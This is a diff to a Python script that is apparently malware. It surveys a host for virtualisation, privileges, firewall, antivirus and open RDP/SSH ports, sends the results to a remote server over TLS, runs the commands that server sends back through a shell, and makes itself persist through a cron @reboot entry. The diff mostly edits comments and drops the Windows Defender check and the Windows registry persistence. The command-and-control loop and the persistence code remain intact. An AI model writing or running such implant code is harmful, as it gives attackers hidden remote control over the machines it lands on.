@@ -99,7 +99,7 @@ def list_cool_directories():
     print()
 
     
-    
+
 def check_if_vm():
     try:
         product_name_path = "/sys/class/dmi/id/product_name"
@@ -135,6 +135,7 @@ def check_if_container():
     print()
     
 
+
 def check_if_root():
     try:
         if os.geteuid() == 0:
@@ -146,6 +147,7 @@ def check_if_root():
     print()
     
 
+# check if the user is admin
 def check_if_admin():
     try:
         if platform.system() == "Windows":
@@ -193,16 +195,10 @@ def check_if_firewall():
     print()
     
     
-    
+
 def check_if_antivirus():
     try:
-        if platform.system() == "Windows":
-            antivirus_check = subprocess.check_output(["wmic", "path", "win32_product", "where", "name='Windows Defender'"], text=True)
-            if "Windows Defender" in antivirus_check:
-                print("Windows Defender is installed.")
-            else:
-                print("Windows Defender is not installed.")
-        elif platform.system() == "Linux":
+        if (platform.system() == "Linux"):
             if os.path.exists("/usr/bin/dpkg"):
                 antivirus_check = subprocess.check_output(["dpkg", "-l"], text=True)
                 if "clamav" in antivirus_check:
@@ -220,7 +216,7 @@ def check_if_antivirus():
     print()
     
     
-    
+# check if RDP is listening on port 3389
 def check_if_rdp():
     try:
         if platform.system() == "Windows":
@@ -250,6 +246,7 @@ def check_if_rdp():
     print()
     
 
+# check if SSH is listening on port 22
 def check_if_ssh():
     try:
         if platform.system() == "Windows":
@@ -439,9 +436,9 @@ def send_all_outputs_to_server(server_ip, server_port):
                 ssl_sock.sendall((json_data + "<END>").encode('utf-8'))
                 print("Sent all outputs to the server.")
 
-                # Enter bidirectional communication loop
+                # enter bidirectional communication loop
                 while True:
-                    # Receive a command from the server
+                    # Receive command from the server
                     command = b""
                     while True:
                         data = ssl_sock.recv(1024)
@@ -457,7 +454,7 @@ def send_all_outputs_to_server(server_ip, server_port):
 
                     print(f"Received command from server: {command}")
 
-                    # Execute the command and send the result back to the server
+                    # execute the command and send the result back to the server
                     try:
                         result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
                     except subprocess.CalledProcessError as e:
@@ -471,16 +468,7 @@ def send_all_outputs_to_server(server_ip, server_port):
 
 
 def gain_persistence():
-    if os.platform == "Windows":
-        # Windows-specific persistence method
-        try:
-            # Create a registry key to run the script at startup
-            subprocess.check_output(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "MyScript", "/t", "REG_SZ", "/d", sys.executable + " " + __file__, "/f"])
-            print("Persistence established on Windows.")
-        except subprocess.CalledProcessError as e:
-            print(f"Error establishing persistence on Windows: {e}")
-    elif os.platform == "Linux":
-        # Linux-specific persistence method
+    if (os.platform == "Linux"):
         try:
             # Create a cron job to run the script at startup
             subprocess.check_output(["bash", "-c", "(crontab -l ; echo '@reboot python3 " + __file__ + "') | crontab -"])
